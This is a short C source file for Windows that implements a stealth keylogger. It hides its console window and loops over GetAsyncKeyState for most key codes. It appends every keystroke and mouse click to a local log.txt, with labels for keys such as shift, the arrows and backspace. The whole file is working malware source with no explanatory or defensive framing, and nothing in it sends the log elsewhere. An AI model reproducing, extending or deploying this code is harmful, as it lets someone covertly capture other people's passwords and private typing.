#include <Windows.h>
#include <stdio.h>
typedef enum {false,true} bool;

void WriteToLog(const char* text) {
	FILE *logfile;
	logfile=fopen("log.txt", "a+");

	fprintf(logfile,"%s",text);
	fclose(logfile);
}

void hide(void) {
	HWND stealth;
	stealth = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
bool KeyIsListed(int iKey) {
	switch (iKey) {
	case VK_SPACE:
		WriteToLog(" ");
		break;
	case VK_RETURN:
		WriteToLog("\n");
		break;
	case VK_SHIFT:
		WriteToLog(" *SHIFT* ");
		break;
	case VK_BACK:
		WriteToLog("\b");
		break;
	case VK_RBUTTON:
		WriteToLog(" *rclick* ");
		break;
	case VK_LBUTTON:
		WriteToLog(" *lclick* ");
		break;
	case VK_UP:
		WriteToLog(" *up* ");
		break;	
	case VK_DOWN:
		WriteToLog(" *down* ");
		break;
	case VK_LEFT:
		WriteToLog(" *left* ");
		break;
	case VK_RIGHT:
		WriteToLog(" *right* ");
		break;		
	default:
		return false;
	}
	return true;
}
int main(int argc, char* argv[]) {
	hide();
	char key;
	while (1) {
		Sleep(10);
		for (key = 8; key < 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (!KeyIsListed(key)) {
					FILE* logfile;
					logfile=fopen("log.txt", "a+");
					fprintf(logfile,"%c",key);
					fclose(logfile);
				}
			}
		}
	}
	return 0;
}
